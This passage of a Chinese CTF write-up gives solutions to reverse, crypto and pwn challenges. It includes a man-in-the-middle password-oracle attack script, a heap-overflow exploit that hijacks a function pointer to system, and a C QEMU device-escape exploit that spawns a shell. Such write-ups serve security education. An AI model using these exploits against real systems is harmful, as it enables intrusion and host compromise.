+    ,0x748F82EE,0x78A5636F,0x84C87814,0x8CC70208,0x90BEFFFA,0x0A4506CEB,0x0BEF9A3F7,0x0C67178F2
+    };
+    void generate(unsigned int *val,unsigned int *out)
+    {
+        unsigned int v[10];
+        for(int i=0;i<8;i++)
+        {
+            out[i]=a[i];
+            v[i]=out[i];
+        }
+        unsigned int mem[64];
+        mem[0]=*val;
+        mem[1]=0x80000000;
+        for(int i=2;i<15;i++)
+            mem[i]=0;
+        mem[15]=0x20;
+        for(int i=16;i<64;i++)
+        {
+            unsigned int v7=(mem[i-2]<<15)|(mem[i-2]>>17);
+            unsigned int v9=(mem[i-2]<<13)|(mem[i-2]>>19);
+            unsigned int v13=mem[i-7]+(v7^v9^(mem[i-2]>>10));
+            unsigned int v15=(mem[i-15]<<25)|(mem[i-15]>>7);
+            unsigned int v17=(mem[i-15]<<14)|(mem[i-15]>>18);
+            unsigned int v20=mem[i-16]+(v15^v17^(mem[i-15]>>3));
+            mem[i]=v13+v20;
+        } 
+        for(int i=0;i<64;i++)
+        {
+            unsigned int v22=(v[4]<<21)|(v[4]>>11);
+    
+            unsigned int v23=((v[4]<<26)|(v[4]>>6))^v22;
+            unsigned int v24=(v[4]<<7)|(v[4]>>25);
+            unsigned int v25=(v24^v23)+v[7];
+            unsigned int v26=(v[6]&~v[4])^(v[5]&v[4]);
+            unsigned int v27=v26+v25;
+            unsigned int v29=v27+consts[i];
+            unsigned int v49=mem[i]+v29;
+            unsigned int v30=(v[0]<<19)|(v[0]>>13);
+            unsigned int v31=((v[0]<<30)|(v[0]>>2))^v30;
+            unsigned int v32=(v[0]<<10)|(v[0]>>22);
+            unsigned int v33=v32^v31;
+            unsigned int v34=(v[0]&v[1])^(v[1]&v[2])^(v[2]&v[0]);
+            unsigned int v35=v34+v33;
+            v[7]=v[6];
+            v[6]=v[5];
+            v[5]=v[4];
+            v[4]=v49+v[3];
+            v[3]=v[2];
+            v[2]=v[1];
+            v[1]=v[0];
+            v[0]=v35+v49;
+        }
+        out[0]+=v[0];
+        out[1]+=v[1];
+        out[2]+=v[2];
+        out[3]+=v[3];
+        out[4]+=v[4];
+        out[5]+=v[5];
+        out[6]+=v[6];
+        out[7]+=v[7];
+    
+    }
+    unsigned int out[30]={0};
+    unsigned char tbl[256]="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    int main()     
+    {
+        unsigned char flag[100];
+        unsigned int s=0;
+        srand(0);
+        for(int i=0;i<256;i++)
+            rand_arr[i]=rand()&0xFF;
+        for(int k=0;k<16;k++)
+            for(int l=0;l<16;l++)
+                box[16*k+l]=16*(15-k)+l;
+        for(int m=1;m>=0;m--)
+            for(int n=15;n>=0;n--)
+            {
+                for(int jj=1;jj<17;jj++)
+                    for(int kk=0;kk<16;kk++)
+                        tmp[jj*16+kk-16]=(rand_arr[kk+16*n]*jj)&0xFF;
+                for(int ll=0;ll<256;ll++)
+                {
+                    real_buf1[m*256+ll]-=ll;
+                    real_buf1[m*256+ll]=real_buf1[m*256+ll]^tmp[ll];
+                }
+    
+                for(int ii=0;ii<256;ii++)
+                    real_buf1[m*256+ii]=box[real_buf1[m*256+ii]];
+            }
+        for(int x=0;x<16;x++)
+        {
+            unsigned int *ptr=(unsigned int *)flag;
+            for(int a=0;a<strlen((char *)tbl);a++)
+                for(int b=0;b<strlen((char *)tbl);b++)
+                    for(int c=0;c<strlen((char *)tbl);c++)
+                        for(int d=0;d<strlen((char *)tbl);d++)
+                        {
+    
+                            flag[0]=tbl[a];
+                            flag[1]=tbl[b];
+                            flag[2]=tbl[c];
+                            flag[3]=tbl[d];
+    
+                            generate(ptr,out);
+                            for(int i=0;i<4;i++)
+                            {
+                                buf1[i]=(out[0]>>(24-8*i))&0xFF;
+                                buf1[i+4]=(out[1]>>(24-8*i))&0xFF;
+                                buf1[i+8]=(out[2]>>(24-8*i))&0xFF;
+                                buf1[i+12]=(out[3]>>(24-8*i))&0xFF;
+                                buf1[i+16]=(out[4]>>(24-8*i))&0xFF;
+                                buf1[i+20]=(out[5]>>(24-8*i))&0xFF;
+                                buf1[i+24]=(out[6]>>(24-8*i))&0xFF;
+                                buf1[i+28]=(out[7]>>(24-8*i))&0xFF;
+                            } 
+                            bool find=true;
+                             for(int i=0;i<32;i++)
+                                 if(buf1[i]!=real_buf1[x*32+i])
+                                {
+                                    find=false;
+                                     break;
+                                } 
+                            if(find)
+                            {
+                                printf("%c%c%c%c",flag[3],flag[2],flag[1],flag[0]);
+                                goto target;
+                            }
+    
+                        }
+            target:
+                s++;
+        }
+    
+    
+        return 0;    
+    
+    }
+    
+
+## Crypto
+
+###  babyLattice
+
+考虑r很小，有$b m + r= c + k n$，故构造格  
+\begin{bmatrix} n & 0 & 0 \ b & 1 & 0 \ c & 0 & X\end{bmatrix}  
+X为放缩因子，目标向量为$(k, m, 1)$时，通过格映射为向量$(r, m, X)$，调整X大小为$2^300$，可成功规约出目标向量，exp如下：
+
+    
+    
+    from hashlib import sha256
+    
+    n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361
+    b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196
+    c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570
+    
+    X = 2**300
+    M = Matrix(ZZ, [[n, 0, 0], [b, 1, 0], [c, 0, X]])
+    
+    ML = M.LLL()
+    
+    r = int(ML[0][0])
+    m = int(abs(ML[0][1]))
+    assert (b * m + r) % n == c
+    
+    print('d3ctf{%s}' % sha256(int(m).to_bytes(50, 'big')).hexdigest())
+    
+
+###  simplegroup
+
+需要用到第一题中有关n，b的关系式，$b a12 – a11 \equiv 0 \mod p,b a11 – a12 \equiv 0 \mod p, b
+a21 – a22 \equiv 0 \mod
+q$，考虑到a11，a12，a21，a22都很小，可以使用格规约，但p，q未知，故考虑将两个式子相乘，得到a11 a21 b^2 -(a11a22 +
+a21a12) b + a12 a22 = k n  
+构造格如下：  
+\begin{bmatrix} n & 0 & 0 \ b & 1 & 0 \ b^2 & 0 & 1\end{bmatrix}  
+这里由于aij非常小，不需要平衡因子，目标向量$(k, -(a11a22 + a21a12), a12 a22)$，通过格映射，得到向量$(-a11
+a21, -(a11a22 + a21a12), a12 * a22)$，之后分解n再通过判断e1/e2次剩余，之后CRT即可，exp如下：
+
+    
+    
+    from Crypto.Util.number import *
+    from tqdm import tqdm
+    
+    
+    def check(s, t, _phi):
+        if _phi % t != 0:
+            return False
+        return pow(s, _phi//t, n) == 1
+    
+    
+    n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361
+    b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196
+    y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328
+    e = 1928983487
+    C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428]
+    
+    e1 = 36493
+    e2 = e//e1
+    
+    X = 1
+    M = Matrix(ZZ, [[n, 0, 0], [b, X, 0], [b ^ 2, 0, X]])
+    ML = M.LLL()
+    
+    # a = a11 * a21, b = a11*a22 + a21*a12, c = a12 * a22
+    '''
+    a = 211380743487233628797755584958526337321408979158793229985661
+    b = 1382843159437215516163973075066558157591473749635266665605630
+    c = 1173142580751247504024100371706709782500216511824162516724129
+    
+    a11, a21, a12, a22 = var('a11, a21, a12, a22')
+    solve([a == a11 * a21, b == a11*a22 + a21*a12, c == a12 * a22], a11, a21, a12, a22)
+    '''
+    
+    
+    a11 = 1018979931854255696816714991181
+    a12 = 1017199123798810531137951821909
+    
+    p = gcd(b * a11 - a12, n)
+    q = n//p
+    assert n == p * q
+    
+    M = []
+    phi = (p-1)*(q-1)
+    for i in tqdm(range(len(C))):
+        for m in range(1, e1+1):
+            tmp = (C[i] * inverse(int(pow(y, m, n)), n)) % n
+            if check(tmp, e1, phi):
+                m1 = m
+                break
+        for m in range(1, e2+1):
+            tmp = (C[i] * inverse(int(pow(y, m, n)), n)) % n
+            if check(tmp, e2, phi):
+                m2 = m
+                break
+        tmp_m = CRT([m1, m2], [e1, e2])
+        M.append(tmp_m)
+    
+    print('M:', M)
+    flag = 0
+    for i in range(len(M)):
+        flag += M[i] * (e**i)
+    
+    print(long_to_bytes(flag))
+    
+
+###  AliceWantFlag
+
+首先与Alice交互，让她连接自己的vps，然后模拟server与她交互，给她提供r和endkey。  
+我们更改r的高位对其密码进行逐字节爆破。当r的第一个字节与之密码一致时，其异或后只剩10位，补上5位endkey只有15位，aes加密时assert处会报错。由此确定一个字节。爆破第二个字节的时候，由于第一个字节使得其密码只剩10位，我们多补一位endkey来满足长度。由此leak其密码。由于密码最后一位无法由此方式爆破出来，我们可以直接去与server交互来爆破最后一位。  
+然后与server交互，利用elgamal的mitm attack获取endkey。最后得到flag
+
+与Alice交互脚本
+
+    
+    
+    from pubkey import Alice_pubkey
+    from elgamal import elgamal
+    from os import urandom
+    from Crypto.Util.number import long_to_bytes , bytes_to_long
+    from Crypto.Cipher import AES
+    from pwn import *
+    from time import *
+    import random
+    #context.log_level = 'debug'
+    
+    pubkey = {}
+    pubkey[b'Alice'] = elgamal(Alice_pubkey)
+    
+    def enc_send(msg , usrid):
+        pubenc = pubkey[usrid]
+        y1 , y2 = pubenc.encrypt(bytes_to_long(msg))
+        return str(y1) + ', ' + str(y2)
+    
+    endkey = b'*'*5
+    
+    
+    
+    
+    #truer = "547dd1ccc3"
+    truer = ""
+    num = len(truer)
+    padr = '*'*(11-num)
+    for i in range(11-num):
+        padr = padr[1:]
+        for j in range(256): #实际上根据结果来看，0123456789abcde即可
+            #####
+            menu=[b'1. signup  2.signin',b'please give me your name',b'please give me your passwd(encrypted and xored by r)',b'signin success',b'now let\'s communicate with this key']
+            sh = remote("47.100.0.15",10003)
+            sh.recvuntil(b"ctf_flag")
+            sh.sendline("49.235.117.239:12345")
+            shalice = listen(12345)
+            shalice.sendline(menu[0])
+            shalice.recv()
+            shalice.sendline(menu[1])
+            shalice.recv()
+            shalice.sendline(menu[2])
+            #####
+            tmpr = truer + chr(j) + padr
+            shalice.sendline(str(bytes_to_long(tmpr.encode('latin1'))))
+            shalice.recv()
+            shalice.sendline(menu[3])
+            shalice.sendline(menu[4])
+            try:
+                shalice.sendline(enc_send(endkey+b'*'*num , b"Alice"))
+                #print(endkey+b'*'*num)
+                #print(tmpr)
+                ans = shalice.recv()
+                if ans != '':
+                    sh.close()
+                    shalice.close()
+                    pass
+            except:
+                truer += chr(j)
+                print("yes",truer)
+                num+=1
+                break
+    
+        else:
+            print("no")
+    
+
+与server交互脚本
+
+    
+    
+    from pubkey import Alice_pubkey
+    from pubkey import server_pubkey
+    from elgamal import elgamal
+    from os import urandom
+    from tqdm import tqdm
+    from Crypto.Util.number import *
+    from Crypto.Cipher import AES
+    from pwn import *
+    from time import *
+    import random
+    
+    def pad(m):
+        m += bytes([16 - len(m) % 16] * (16 - len(m) % 16))
+        return m
+    
+    def unpad(m):
+        return m[:-m[-1]]
+    
+    context.log_level = 'debug'
+    
+    def enc_send_s(msg):
+        pubenc = elgamal(server_pubkey)
+        y1 , y2 = pubenc.encrypt(bytes_to_long(msg))
+        return str(y1) + ', ' + str(y2)
+    
+    pubkey = {}
+    pubkey[b'Alice'] = elgamal(Alice_pubkey)
+    
+    def enc_send(msg , usrid):
+        pubenc = pubkey[usrid]
+        y1 , y2 = pubenc.encrypt(bytes_to_long(msg))
+        return str(y1) + ', ' + str(y2)
+    
+    
+    '''
+    for i in "1234567890abcdef":
+        sh = remote("47.100.0.15",10001)
+        sh.recvuntil("\n")
+        sh.sendline('2')
+        sh.recvuntil("\n")
+        sh.sendline('Alice')
+        sh.recvuntil("\n")
+        r = int(sh.recvuntil("\n")[:-1])
+        AlicePasswd = ("547dd1ccc3"+i).encode('latin1')
+        #547dd1ccc38
+        userdata = long_to_bytes(bytes_to_long(AlicePasswd) ^ r)
+        sh.sendline(enc_send(userdata))
+        ans = sh.recvuntil("\n")
+        if b'error' not in ans:
+            print("yes",AlicePasswd)
+            break
+        sh.close()
+    else:
+        print("no")
+    '''
+    def mitm(u):
+        print(type(u))
+        print(u)
+        ans1={}
+        (p,q,g,y) = Alice_pubkey
+        #for i in tqdm(range(1,2**22)):
+            #ans1[str(pow(i,q,p))] = i
+        #with open("set.set",'wb') as f:
+            #pickle.dump(ans1,f)
+        with open("set.set","rb") as f:
+            ans1 = pickle.load(f)
+    
+        for i in tqdm(range(1,2**18)):
+            try:
+                tmp = str(pow(u*inverse(i,p),q,p))
+                true = (ans1[tmp]*i)%p
+                print(true)
+                return true
+            except Exception as aa:
+                #print(aa)
+                pass
+    
+        else:
+            print("no")
+    
+    with open("set.set","rb") as f:
+        ans1 = pickle.load(f)
+    
+    #while True:
+    for i in range(20):
+        sh = remote("47.100.0.15",10001)
+        sh.recvuntil("\n")
+        sh.sendline('2')
+        sh.recvuntil("\n")
+        sh.sendline('Alice')
+        sh.recvuntil("\n")
+        r = int(sh.recvuntil("\n")[:-1])
+        AlicePasswd = b"547dd1ccc38"
+        userdata = long_to_bytes(bytes_to_long(AlicePasswd) ^ r)
+        sh.sendline(enc_send_s(userdata))
+        ans = sh.recvuntil("\n")
+        sh.recvuntil('with this key\n')
+        endkey_enc = sh.recvuntil("\n")[:-1].decode().replace(" ","").split(",")
+    
+        try:
+            endkey = mitm(int(endkey_enc[1]))
+            key = userdata + long_to_bytes(endkey)
+            msg = b'I am Alice, Please give me true flag'
+            aes = AES.new(key, AES.MODE_ECB)
+            sh.sendline(aes.encrypt(pad(msg)))
+            flag = sh.recvuntil("\n")[:-1]
+            print(unpad(aes.decrypt(flag)))
+        except Exception as e:
+            print(e)
+            pass
+    
+
+## Pwn
+
+###  trust
+
+![](https://p4.ssl.qhimg.com/t01316343df483c5011.png)
+
+![](https://p3.ssl.qhimg.com/t018a6f795e52886b1a.png)
+
+![](https://p1.ssl.qhimg.com/t01ce64e170df4a2ba7.png)
+
+溢出改meme函数指针。
+
+    
+    
+    <a>
+     <b>cccccccc</b>
+     <d>bbbbbbbb</d>
+     <c>dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+     ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+     </c>
+    </a>
+    
+    
+    
+    #!/usr/bin/python
+    from pwn import *
+    #context.log_level='debug'
+    
+    def edit(name,content):
+        sh.sendlineafter('Choice: ','2')
+        sh.sendline(name+' '+content)
+    
+    def show_old(name):
+        sh.sendlineafter('Choice: ','4')
+        sh.sendline(name)
+    
+    sh=process('./Truth')
+    sh=remote('106.14.216.214',45445)
+    #pause()
+    xmlfile=open("./filelist.xml","r")
+    content=xmlfile.read()
+    xmlfile.close()
+    sh.sendlineafter('Choice: ','1')
+    sh.send(content+"\xff")
+    show_old('b')
+    sh.recvuntil('Useless')
+    libc_base=u64(sh.recv(6).ljust(8,'\x00'))-0x3c4b78
+    print(hex(libc_base))
+    free_hook=libc_base+0x1EEB28
+    one_gadget=libc_base+0xe6c7e
+    system=libc_base+0x453a0
+    system=libc_base+0xf1207
+    edit('d','z'*0x70)
+    edit('d','x'*0x180)
+    show_old('d')
+    sh.recvuntil('z'*0x70)
+    heap=u64(sh.recvline()[:-1].ljust(8,'\x00'))-0x11e30
+    print(hex(heap))
+    edit('b','y'*0x58+p64(0x31)+p64(0x405608)+p64(0x100000001)+p64(heap+0x12b10)+p64(heap+0x12b40)+p64(heap+0x12b50)+p64(0x21)+p64(heap+0x11c30)+p64(heap+0x11c10)+p64(system)+p64(0xa1)+p64(0x4054e0)+p64(0x100000001)+p64(heap+0x11e40))
+    edit('b','x'*0x18)
+    edit('\x00'*0x80,'b')
+    
+    show_old('d')
+    #gdb.attach(sh)
+    sh.interactive()
+    
+
+###  d3dev
+
+qemu逃逸题，可以任意读写a1数组中的值，只是读写时分别会进行tea解密和加密，密钥可以通过pmio_read拿到。调试发现a1[1212]处存储了rand_r的地址，所以泄露出来加密还原得到libc地址，不过需要读2次，第一次读出低4字节，第2次读出高4字节。写入时也是同样的，先写入低4字节，再写入高4字节。将system地址写入到a1[1212]后，通过pmio_write可以调用，此时写入值为0x6873（sh）就可以拿到shell。
+
+![](https://p5.ssl.qhimg.com/t017d4ee57c73eb18be.png)
+
+exp:
+
+    
+    
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <assert.h>
+    #include <fcntl.h>
+    #include <inttypes.h>
+    #include <sys/mman.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    #include <sys/io.h>   
+    #include <stdint.h>
+    
+    unsigned char* mmio_base;
+    void mmio_write(int offset,int value)
+    {
+        *(unsigned int*)(mmio_base+offset)=value;
+    }
+    
+    unsigned int mmio_read(int offset)
+    {
+        return *(unsigned int*)(mmio_base+offset);
+    }
+    
+    void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
+    {
+        unsigned int y = *firstChunk;
+        unsigned int z = *secondChunk;
+        unsigned int sum = 0;
+    
+        unsigned int delta = 0x9e3779b9;
+    
+        do
+        {
+            sum += delta;
+            y += ((z << 4) + key[0]) ^ (z + sum) ^ ((z >> 5) + key[1]);
+            z += ((y << 4) + key[2]) ^ (y + sum) ^ ((y >> 5) + key[3]);
+        }while(sum!=0xC6EF3720);
+    
+        *firstChunk = y;
+        *secondChunk = z;
+    }
+    
+    //buffer：输入的待加密数据buffer，在函数中直接对元数据buffer进行加密；size：buffer长度；key是密钥；
+    void EncryptBuffer(char* buffer, int size, unsigned int* key)
+    {
+        char *p = buffer;
+    
+        int leftSize = size;
+    
+        while (p < buffer + size &&
+            leftSize >= sizeof(unsigned int) * 2)
+        {
+            EncryptTEA((unsigned int *)p, (unsigned int *)(p + sizeof(unsigned int)), key);
+            p += sizeof(unsigned int) * 2;
+    
+            leftSize -= sizeof(unsigned int) * 2;
+        }
+    }
+    
+    void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
+    {
+        unsigned int  sum = 0xC6EF3720;
+        unsigned int  y = *firstChunk;
+        unsigned int  z = *secondChunk;
+        unsigned int  delta = 0x9e3779b9;
+    
+        do
+        {
+            z -= (y << 4) + key[2] ^ y + sum ^ (y >> 5) + key[3];
+            y -= (z << 4) + key[0] ^ z + sum ^ (z >> 5) + key[1];
+            sum -= delta;
+        }while(sum!=0);
+    
+        *firstChunk = y;
+        *secondChunk = z;
+    }
+    
+    //buffer：输入的待解密数据buffer，在函数中直接对元数据buffer进行解密；size：buffer长度；key是密钥；
+    void DecryptBuffer(char* buffer, int size, unsigned int* key)
+    {
+        char *p = buffer;
+    
+        int leftSize = size;
+    
+        while (p < buffer + size &&
+            leftSize >= sizeof(unsigned int) * 2)
+        {
+            DecryptTEA((unsigned int *)p, (unsigned int *)(p + sizeof(unsigned int)), key);
+            p += sizeof(unsigned int) * 2;
+    
+            leftSize -= sizeof(unsigned int) * 2;
+        }
+    }
+    
+    void decrypt(unsigned long *v, unsigned long *k) {
+         unsigned long y=v[0], z=v[1], sum=0xC6EF3720, i; /* set up */
+         unsigned long delta=0x61C88647;                  /* a key schedule constant */
+         unsigned long a=k[0], b=k[1], c=k[2], d=k[3];    /* cache key */
+         do {                            /* basic cycle start */
+             z -= ((y<<4) + c) ^ (y + sum) ^ ((y>>5) + d);
+             y -= ((z<<4) + a) ^ (z + sum) ^ ((z>>5) + b);
+             sum += delta;                                /* end cycle */
+         }while(sum);
+         v[0]=y;
+         v[1]=z;
+    }
+    
+    int main()
+    {
+        int pmio_base=0xc040,i;
+        unsigned long long temp,system_addr,box;
+        unsigned int addr[2];
+        unsigned int keys[4];
+        unsigned char buf[4];
+        int fd=open("/sys/devices/pci0000:00/0000:00:03.0/resource0",O_RDWR | O_SYNC);
+        printf("%d\n",fd);
+        mmio_base=mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);
+        int key1211,key1210,key1209,key1208;
+        iopl(3);
+        key1211=inl(pmio_base+24);
+        printf("%x\n",key1211);
+        key1210=inl(pmio_base+20);
+        key1209=inl(pmio_base+16);
+        key1208=inl(pmio_base+12);
+        keys[0]=key1208;
+        keys[1]=key1209;
+        keys[2]=key1210;
+        keys[3]=key1211;
+        outl(0x100,pmio_base+8);
+        addr[0]=mmio_read(24);
+        addr[1]=mmio_read(24);
+        EncryptBuffer(addr,8,keys);
+        temp=addr[1];
+        temp=(temp<<32)+addr[0];
+        printf("%llx\n",temp);
+        system_addr=temp-0x4aeb0+0x55410;
+        printf("%llx\n",system_addr);
+        addr[0]=system_addr&0xffffffff;
+        addr[1]=(system_addr>>32)&0xffffffff;
+        DecryptBuffer(addr,8,keys);
+        temp=addr[1];
+        temp=(temp<<32)+addr[0];
+        printf("%llx\n",temp);
+        mmio_write(24,addr[0]);
+        mmio_write(24,addr[1]);
+    
+        outl(0,pmio_base+8);
+        //mmio_write(4*8,11);
+        box=0x6d6f682f74632f65;
+        addr[1]=box&0xffffffff;
+        addr[0]=(box>>32)&0xffffffff;
+        DecryptBuffer(addr,8,keys);
+        mmio_write(0,addr[0]);    //"/home/ct"
+        mmio_write(0,addr[1]);
+        //mmio_write(5*8,22);
+    
+        box=0x6c662f6600006761;// f/flag
+        addr[1]=box&0xffffffff;
+        addr[0]=(box>>32)&0xffffffff;
+        DecryptBuffer(addr,8,keys);
+        mmio_write(8,addr[0]);
+        mmio_write(8,addr[1]);
+        //mmio_write(6*8,33);
+    
+        //outl(0xff,pmio_base+8);
+        //decrypt((unsigned long*)&system_addr,keys);
+        //mmio_write(4*8,system_addr); //decrypt(system_addr)
+        outl(0x6873,pmio_base+0x1c);//"sh"
+    
+        //outl(0x6873,pmio_base+28);
+        return 0;
+    }
+    
+
+###  d3dev-revenge
+
+做法与上题相同。
+
+## Bonus
+
+###  问卷
+
+Goodgame
+
+###  预热任务1 ，2
+
+Goodgame
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Retr_0** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/233829](/post/id/233829)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t010457258f753577cd.png) Retr_0
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
